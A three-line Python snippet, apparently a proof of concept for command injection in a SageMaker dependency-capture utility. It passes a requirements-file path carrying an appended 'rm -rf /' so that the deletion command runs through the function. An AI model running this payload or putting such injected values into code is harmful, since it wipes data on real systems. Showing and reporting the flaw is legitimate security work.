from sagemaker.serve.save_retrive.version_1_0_0.save.utils import capture_dependencies

user_input = "/path/to/requirements.txt; rm -rf /"
capture_dependencies(requirements_path=user_input)